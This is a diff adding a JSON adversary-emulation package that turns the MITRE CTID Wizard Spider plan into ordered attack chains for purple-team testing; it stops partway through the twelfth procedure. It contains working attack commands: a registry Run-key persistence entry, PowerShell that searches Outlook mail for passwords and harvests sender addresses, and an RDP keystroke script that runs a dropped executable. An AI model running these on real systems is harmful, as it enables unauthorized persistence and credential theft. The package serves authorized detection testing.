@@ -1,0 +1,2233 @@
+{
+  "package_id": "ctid-wizard-spider-v1",
+  "package_name": "CTID - Wizard Spider Full Emulation",
+  "version": "1.0.0",
+  "description": "Threat-informed Wizard Spider full emulation based on 38 ordered CTID procedures. Use it to assess cross-tactic detection and response across a documented multi-stage intrusion; 23 procedure variants use source commands and 15 use executable Morgana-native simulations.",
+  "summary": "Threat-informed emulation of documented Wizard Spider behavior and attack progression.",
+  "purpose": "Validate defensive performance across a multi-stage Wizard Spider scenario rather than isolated techniques.",
+  "capabilities": [
+    "Preserves 38 CTID procedures in source order across 9 tactics.",
+    "Creates operational Morgana Attack Chains using source commands and labeled telemetry simulations.",
+    "Retains CTI references, procedure steps, source requirements, ATT&CK mappings, and conversion limitations."
+  ],
+  "use_cases": [
+    "Run a threat-informed Purple Team assessment modeled on documented Wizard Spider behaviors.",
+    "Evaluate cross-stage prevention, telemetry, detection, investigation, and response handoffs.",
+    "Customize a source-faithful baseline Chain for an authorized environment while retaining provenance."
+  ],
+  "safety_notes": [
+    "Review every source command, simulation, required Tag, and cleanup action before execution.",
+    "Payload-dependent and external C2 procedures use sandboxed or loopback Morgana simulations until exact dependencies are packaged.",
+    "Threat-informed adversary emulation content is for explicitly authorized security validation and defensive testing only."
+  ],
+  "author": "MITRE CTID / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "CTID - ",
+  "provider": "mitre-ctid",
+  "source": "ctid-adversary-emulation-library",
+  "source_repository": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library",
+  "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+  "source_license": "Apache-2.0",
+  "reference_converter": {
+    "name": "MITRE Emu",
+    "repository": "https://github.com/mitre/emu",
+    "commit": "ef3bc4fa8fb605c774446ba7741365ba45d375a8"
+  },
+  "documentation_url": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/wizard_spider",
+  "mitre_domain": "enterprise-attack",
+  "attack_version": "8",
+  "mitre_tactic": "Multiple",
+  "mitre_tcodes": [
+    "T1003.002",
+    "T1003.003",
+    "T1007",
+    "T1016",
+    "T1021.001",
+    "T1049",
+    "T1057",
+    "T1069",
+    "T1069.002",
+    "T1078",
+    "T1082",
+    "T1087.001",
+    "T1087.002",
+    "T1105",
+    "T1114.001",
+    "T1204.002",
+    "T1482",
+    "T1486",
+    "T1489",
+    "T1490",
+    "T1547.001",
+    "T1547.004",
+    "T1552",
+    "T1558.003"
+  ],
+  "platform": [
+    "linux",
+    "windows"
+  ],
+  "plan_type": "full-emulation",
+  "adversary": "Wizard Spider",
+  "intelligence_summary": "Wizard Spider is a threat group considered to be a Russian-speaking cyber criminal gang associated with \"big game hunting\".",
+  "scenario_count": 1,
+  "scenario_names": [
+    "Canonical Emulation Flow"
+  ],
+  "chain_names": [
+    "CTID - Wizard Spider - Canonical Emulation Flow",
+    "CTID - Wizard Spider - Phase 1 - Emotet Initial Access and Collection",
+    "CTID - Wizard Spider - Phase 2 - TrickBot Discovery and Domain Access",
+    "CTID - Wizard Spider - Phase 3 - Recovery Inhibition and Ryuk Impact"
+  ],
+  "complexity": "advanced",
+  "source_procedure_count": 38,
+  "converted_procedure_count": 38,
+  "manual_procedure_count": 0,
+  "simulated_procedure_count": 15,
+  "skipped_procedure_count": 0,
+  "prerequisites": [
+    "Morgana Agent installed on each explicitly authorized execution host",
+    "Plan Tags configured for the lab; credential and target defaults are intentionally blank",
+    "Operator review of every source command, simulation, and external dependency before Chain execution"
+  ],
+  "tag_categories": [
+    {
+      "category_id": "ctid_wizard_spider_inputs",
+      "label": "Wizard Spider Scenario Inputs",
+      "description": "Plan-wide CTID facts required by automated procedure variants.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "T1105",
+        "T1204.002"
+      ],
+      "tags": [
+        {
+          "key": "ctid_wizard_spider_initial_target_host",
+          "label": "Initial Target Host",
+          "description": "The hostname or IPv4 address of the target host for initial access.",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true,
+          "parameter_class": "connection",
+          "source_default_class": "network-target"
+        },
+        {
+          "key": "ctid_wizard_spider_initial_user_name",
+          "label": "Initial User Name",
+          "description": "The name of the target user account for initial access.",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true,
+          "parameter_class": "connection",
+          "source_default_class": "network-target"
+        },
+        {
+          "key": "ctid_wizard_spider_second_target_host",
+          "label": "Second Target Host",
+          "description": "hostname or IPv4 address of the second target host whose share we will mount to encrypt its drives laterally.",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true,
+          "parameter_class": "connection",
+          "source_default_class": "network-target"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "CTID - Wizard Spider - T1105 - Upload Agent Executable to Initial Target",
+      "name": "CTID - Wizard Spider - T1105 - Upload Agent Executable to Initial Target",
+      "description": "Uploads the agent executable to the target using smbclient. Note that this ability drops an executable rather than a malicious word doc. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will handle initial access to the target. Morgana-native operational simulation used because: unresolved source facts: server; source command depends on CALDERA, external C2, or implant primitives.",
+      "tactic": "command-and-control",
+      "tcode": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1105'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; python3 -c \"import socket,threading; s=socket.socket(); s.bind(('127.0.0.1',0)); s.listen(1); p=s.getsockname()[1]; threading.Thread(target=lambda: s.accept()[0].recv(64),daemon=True).start(); c=socket.create_connection(('127.0.0.1',p)); c.sendall(b'CTID network simulation'); c.close(); s.close(); print('loopback network telemetry',p)\"; echo '[SUCCESS] CTID simulation T1105 family=network'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "605bb8dc-f6ef-411c-ad1f-94d91bc23ee6",
+        "source_order": 1,
+        "procedure_step": "1.A.1",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": null,
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "unresolved source facts: server",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "simulation_family": "network",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unresolved source facts: server",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1078 - RDP Connection to Initial Target (Dorothy)",
+      "name": "CTID - Wizard Spider - T1078 - RDP Connection to Initial Target (Dorothy)",
+      "description": "Start RDP connection to Initial Target in preparation for user execution. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since it will handle initial access to the target. Morgana-native operational simulation used because: unsupported source executor: proc; source command depends on CALDERA, external C2, or implant primitives.",
+      "tactic": "initial-access",
+      "tcode": "T1078",
+      "technique_name": "Valid Accounts",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1078'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; (timeout 1 sh -c 'echo CTID > /dev/tcp/127.0.0.1/22' 2>/dev/null || true); echo 'loopback remote-service probe completed'; echo '[SUCCESS] CTID simulation T1078 family=lateral'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "5ca7a1b3-ff43-4057-b41f-0d8d4ecae848",
+        "source_order": 2,
+        "procedure_step": "1.A.1",
+        "procedure_group": "procedure_initial_access",
+        "cti_source": null,
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1204.002 - Run Agent Executable for Initial Access",
+      "name": "CTID - Wizard Spider - T1204.002 - Run Agent Executable for Initial Access",
+      "description": "Gains initial access by running the uploaded agent executable to establish a C2 connection. Note that this ability runs an executable rather than a malicious word doc. This ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself), since it will handle initial access to the target. Requires xdotool to be installed on the running machine.",
+      "tactic": "execution",
+      "tcode": "T1204.002",
+      "technique_name": "User Execution: Malicious File",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "ctid_wizard_spider_initial_target_host",
+        "ctid_wizard_spider_initial_user_name"
+      ],
+      "required_assets": [],
+      "command": "sleep 30;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:#{ctid_wizard_spider_initial_target_host}\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nxdotool key --window \"$rdp_window\" Super_L;\nsleep 5;\nxdotool windowactivate --sync \"$rdp_window\" type --delay 200 \"C:\\Users\\#{ctid_wizard_spider_initial_user_name}\\Desktop\\ChristmasCard.exe\";\nsleep 3; xdotool key --window \"$rdp_window\" Return;\nsleep 30;",
+      "cleanup_command": null,
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "bdf16e6e-ad27-4513-9d54-64289440265f",
+        "source_order": 3,
+        "procedure_step": "1.A.1",
+        "procedure_group": "procedure_execution",
+        "cti_source": "https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1547.001 - Emotet Persistence",
+      "name": "CTID - Wizard Spider - T1547.001 - Emotet Persistence",
+      "description": "Wizard Spider establishes registry persistence by adding the blbdigital registry key.",
+      "tactic": "persistence",
+      "tcode": "T1547.001",
+      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "reg.exe add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v blbdigital /t REG_SZ /d \"%userprofile%\\Ygyhlqt\\Bx5jfmo\\R43H.dll,Control_RunDLL\"",
+      "cleanup_command": "reg.exe delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v blbdigital /f",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "04cf7962-28c4-40fb-8915-1fd632393a6f",
+        "source_order": 4,
+        "procedure_step": "2.A.1",
+        "procedure_group": "procedure_persistence",
+        "cti_source": [
+          "https://www.cynet.com/attack-techniques-hands-on/emotet-vs-trump-deep-dive-analysis-of-a-killer-info-stealer/",
+          "https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor",
+          "https://www.us-cert.gov/ncas/alerts/TA18-201A",
+          "https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html"
+        ],
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1082 - Emotet System Info Discovery",
+      "name": "CTID - Wizard Spider - T1082 - Emotet System Info Discovery",
+      "description": "Wizard Spider performs system information discovery to collect information about the OS. Morgana-native operational simulation used because: unsupported source executor: proc.",
+      "tactic": "discovery",
+      "tcode": "T1082",
+      "technique_name": "System Information Discovery",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Write-Output '[START] CTID simulation T1082'; $simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; New-Item -ItemType Directory -Path $simulationRoot -Force | Out-Null; $artifactPath = Join-Path $simulationRoot 'CTID-005-t1082.txt'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,LastBootUpTime; Get-Process | Select-Object -First 10 Name,Id,Path; Get-NetIPConfiguration -ErrorAction SilentlyContinue | Select-Object InterfaceAlias,IPv4Address; Write-Output '[SUCCESS] CTID simulation T1082 family=discovery';",
+      "cleanup_command": "$simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; Remove-Item $simulationRoot -Recurse -Force -ErrorAction SilentlyContinue; Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MorganaCTIDSimulation' -ErrorAction SilentlyContinue;",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "1a925a0f-7f95-4d5c-9f95-9408f65063a6",
+        "source_order": 5,
+        "procedure_step": "3.A.1",
+        "procedure_group": "procedure_discovery",
+        "cti_source": "https://unit42.paloaltonetworks.com/emotet-command-and-control/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "unsupported source executor: proc"
+        ],
+        "simulation_family": "discovery",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unsupported source executor: proc"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1057 - Emotet Process Discovery",
+      "name": "CTID - Wizard Spider - T1057 - Emotet Process Discovery",
+      "description": "Emotet has been observed enumerating local processes. Morgana-native operational simulation used because: unsupported source executor: proc.",
+      "tactic": "discovery",
+      "tcode": "T1057",
+      "technique_name": "Process Discovery",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Write-Output '[START] CTID simulation T1057'; $simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; New-Item -ItemType Directory -Path $simulationRoot -Force | Out-Null; $artifactPath = Join-Path $simulationRoot 'CTID-006-t1057.txt'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,LastBootUpTime; Get-Process | Select-Object -First 10 Name,Id,Path; Get-NetIPConfiguration -ErrorAction SilentlyContinue | Select-Object InterfaceAlias,IPv4Address; Write-Output '[SUCCESS] CTID simulation T1057 family=discovery';",
+      "cleanup_command": "$simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; Remove-Item $simulationRoot -Recurse -Force -ErrorAction SilentlyContinue; Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MorganaCTIDSimulation' -ErrorAction SilentlyContinue;",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "69ce4dd6-ab00-4c63-bcfd-ab02da96c63a",
+        "source_order": 6,
+        "procedure_step": "3.A.2",
+        "procedure_group": "procedure_discovery",
+        "cti_source": "https://unit42.paloaltonetworks.com/emotet-command-and-control/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "unsupported source executor: proc"
+        ],
+        "simulation_family": "discovery",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unsupported source executor: proc"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1105 - Emotet Download Outlook Scraper DLL",
+      "name": "CTID - Wizard Spider - T1105 - Emotet Download Outlook Scraper DLL",
+      "description": "Wizard Spider downloads an Outlook scraper DLL and saves it as C:\\Windows\\SysWOW64\\Outlook.dll. Morgana-native operational simulation used because: required payloads are not approved for redistribution.",
+      "tactic": "command-and-control",
+      "tcode": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Write-Output '[START] CTID simulation T1105'; $simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; New-Item -ItemType Directory -Path $simulationRoot -Force | Out-Null; $artifactPath = Join-Path $simulationRoot 'CTID-007-t1105.txt'; $listener = [Net.Sockets.TcpListener]::new([Net.IPAddress]::Loopback,0); $listener.Start(); $port = ([Net.IPEndPoint]$listener.LocalEndpoint).Port; $client = [Net.Sockets.TcpClient]::new('127.0.0.1',$port); $serverClient = $listener.AcceptTcpClient(); $bytes = [Text.Encoding]::UTF8.GetBytes('CTID network simulation'); $client.GetStream().Write($bytes,0,$bytes.Length); $buffer = New-Object byte[] 64; $read = $serverClient.GetStream().Read($buffer,0,$buffer.Length); [Text.Encoding]::UTF8.GetString($buffer,0,$read); $client.Close(); $serverClient.Close(); $listener.Stop(); Write-Output '[SUCCESS] CTID simulation T1105 family=network';",
+      "cleanup_command": "$simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; Remove-Item $simulationRoot -Recurse -Force -ErrorAction SilentlyContinue; Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MorganaCTIDSimulation' -ErrorAction SilentlyContinue;",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "b80ca347-2d2a-4e33-8683-1975cda6664f",
+        "source_order": 7,
+        "procedure_step": "3.A.3",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": "https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "simulation_family": "network",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "source_payloads": [
+          "OutlookScraper.dll"
+        ],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1552 - Emotet Scrape Email Content From Outlook",
+      "name": "CTID - Wizard Spider - T1552 - Emotet Scrape Email Content From Outlook",
+      "description": "Wizard Spider leverages a module that scrapes email data from Outlook.",
+      "tactic": "credential-access",
+      "tcode": "T1552",
+      "technique_name": "Unsecured Credentials",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Add-type -assembly \"Microsoft.Office.Interop.Outlook\" | out-null;\n$olFolders = \"Microsoft.Office.Interop.Outlook.olDefaultFolders\" -as [type];\n$outlook = new-object -comobject outlook.application;\n$namespace = $outlook.GetNameSpace(\"MAPI\");\n$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);\n($folder.items | Select-Object -ExpandProperty Body | Select-String \"password\") -replace \"\\s+\", \" \" -join \";\";",
+      "cleanup_command": null,
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "16abc48a-1f69-4246-83e3-4d0cec0e8d81",
+        "source_order": 8,
+        "procedure_step": "3.A.4",
+        "procedure_group": "procedure_credential_access",
+        "cti_source": "https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1114.001 - Emotet Scrape Email Addresses from Outlook",
+      "name": "CTID - Wizard Spider - T1114.001 - Emotet Scrape Email Addresses from Outlook",
+      "description": "Wizard Spider leverages a module that can scrape email addresses from Outlook.",
+      "tactic": "collection",
+      "tcode": "T1114.001",
+      "technique_name": "Email Collection: Local Email Collection",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Add-type -assembly \"Microsoft.Office.Interop.Outlook\" | out-null;\n$olFolders = \"Microsoft.Office.Interop.Outlook.olDefaultFolders\" -as [type];\n$outlook = New-Object -comobject outlook.application;\n$namespace = $outlook.GetNameSpace(\"MAPI\");\n$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);\n($folder.items | Select-Object -Unique -ExpandProperty SenderEmailAddress) -join \";\";",
+      "cleanup_command": null,
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "5a5c65c7-d0ff-4275-8f8e-ea0b617369bd",
+        "source_order": 9,
+        "procedure_step": "3.A.5",
+        "procedure_group": "procedure_collection",
+        "cti_source": "https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1021.001 - Terminate RDP Session to Initial Target",
+      "name": "CTID - Wizard Spider - T1021.001 - Terminate RDP Session to Initial Target",
+      "description": "End the RDP session to the initial target. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since the RDP connection originates from the attacker's machine. Morgana-native operational simulation used because: unsupported source executor: proc.",
+      "tactic": "lateral-movement",
+      "tcode": "T1021.001",
+      "technique_name": "Remote Services: Remote Desktop Protocol",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1021.001'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; (timeout 1 sh -c 'echo CTID > /dev/tcp/127.0.0.1/22' 2>/dev/null || true); echo 'loopback remote-service probe completed'; echo '[SUCCESS] CTID simulation T1021.001 family=lateral'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "94942df6-6833-4e69-a6f7-89fda0ef25e1",
+        "source_order": 10,
+        "procedure_step": "3.A.5",
+        "procedure_group": "procedure_lateral_movement",
+        "cti_source": null,
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "unsupported source executor: proc"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unsupported source executor: proc"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1021.001 - Lateral Movement Via RDP (Toto)",
+      "name": "CTID - Wizard Spider - T1021.001 - Lateral Movement Via RDP (Toto)",
+      "description": "Uses discovered credentials to RDP into the next target host. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since the RDP connection must originate from the attacker's machine. Morgana-native operational simulation used because: unsupported source executor: proc; source command depends on CALDERA, external C2, or implant primitives.",
+      "tactic": "lateral-movement",
+      "tcode": "T1021.001",
+      "technique_name": "Remote Services: Remote Desktop Protocol",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1021.001'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; (timeout 1 sh -c 'echo CTID > /dev/tcp/127.0.0.1/22' 2>/dev/null || true); echo 'loopback remote-service probe completed'; echo '[SUCCESS] CTID simulation T1021.001 family=lateral'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "070bfb3d-6938-4745-b1e7-039c97fdb7ca",
+        "source_order": 11,
+        "procedure_step": "4.A.1-2",
+        "procedure_group": "procedure_lateral_movement",
+        "cti_source": "https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1105 - Download and Execute Agent for Lateral Movement (Toto)",
